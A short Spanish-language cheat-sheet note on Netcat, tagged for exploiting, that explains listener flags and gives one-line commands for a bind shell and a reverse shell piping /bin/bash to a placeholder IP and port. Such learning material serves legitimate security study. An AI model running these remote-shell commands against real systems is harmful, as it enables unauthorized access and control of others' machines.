# NetCat

***

* Tags: #herramientas #bash #exploiting

***

## Definición

> **Netcat** es una herramienta de red que permite a través de intérprete de comandos y con una sintaxis sencilla abrir puertos TCP/UDP en un HOST, asociar una \[\[Shell]] a un puerto en concreto y forzar conexiones UDP/TCP.

Para más información, puedes consultar [Wikipedia](https://es.wikipedia.org/wiki/Netcat)

***

## Uso

Para ponernos en escucha por un determinado puerto, podemos ejecutar el siguiente comando en bash:

```bash
nc -lnvp <puerto>
```

Donde cada parámetro significa lo siguiente:

* `-l`: Indica que abre el puerto para escucha (listen), solo acepta una **única** conexión de un cliente y se cierra
* `-n`: Indica que no se desea aplicar resolución DNS
* `-v`: Muestra información de la conexión (verbose)
* `-p`: Indica el puerto que desea ser abierto

Para ponernos en escucha por un determinado puerto, pero ofreciendo algún comando, con la posibilidad de intentar una \[\[Bind shell]],podríamos ejecutar lo siguiente:

```bash
nc -lnvp <puerto> -e <comando>
nc -lnvp <puerto> -e /bin/bash         #Útil si queremos establecer una bind shell
```

Donde el parámetro signfica lo siguiente:

* `-e`: Indica un comando específico a ejecutar después de haber establecido una conexión

Para ejecutar un comando en una máquina con **netcat** ejecutándose, es decir, con un puerto abierto, con posibilidad de intentar una \[\[Reverse shell]], podemos hacer uso del siguiente comando en bash:

```bash
nc -e <comando> <IP> <puerto>
nc -e /bin/bash <IP> <puerto>          #Útil si queremos establecer una reverse shell
```
